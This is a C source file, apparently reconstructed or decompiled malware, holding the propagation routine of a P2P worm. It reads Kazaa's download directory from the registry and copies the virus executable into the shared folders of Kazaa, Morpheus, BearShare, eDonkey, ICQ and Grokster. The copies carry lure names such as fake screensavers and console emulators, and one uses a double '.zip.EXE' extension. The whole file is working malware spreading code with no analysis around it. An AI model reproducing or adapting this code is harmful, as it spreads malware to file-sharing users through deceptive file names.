#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <string.h>

void _P2PCopy(void)
{
    volatile struct _LocalCtx {
        int i;
        DWORD size;
    } ctx;

    ctx.i = 0;  // initialize (original was uninitialized but we set to 0)
    ctx.size = sizeof(_Kazaa);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Kazaa\\Transfer", 0, KEY_READ, &_hKey);
    RegQueryValueExA(_hKey, "DlDir0", NULL, NULL, (LPBYTE)_Kazaa, &ctx.size);
    RegCloseKey(_hKey);

    // Original: if (Kazaa[0]>64 && Kazaa[0]<123)
    if (_Kazaa[0] > 64 && _Kazaa[0] < 123) {
        // Copy Kazaa to KazaaFull
        strcpy(_KazaaFull, _Kazaa);
        // Append the filename
        strcat(_KazaaFull, "\\Kira Kerner SCREENSAVER.Scr");

        CopyFileA(_VirusPath, _KazaaFull, FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\Morpheus\\My Shared Folder\\HOT SEXY SCREENSAVER.Scr", FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\BearShare\\Shared\\XBOX EMU REALWORKING.EXE", FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\EDonkey2000\\Incoming\\PS2 EMU REALWORKING.EXE", FALSE);
        CopyFileA(_VirusPath, "\\My Downloads\\NUDIE SCREENSAVER.Scr", FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\ICQ\\Shared Files\\GAMECUBE EMU REALWORKING.EXE", FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\Grokster\\My Grokster\\KOF2K2.zip.EXE", FALSE);
    }

    return;
}
#pragma optimize("", on)
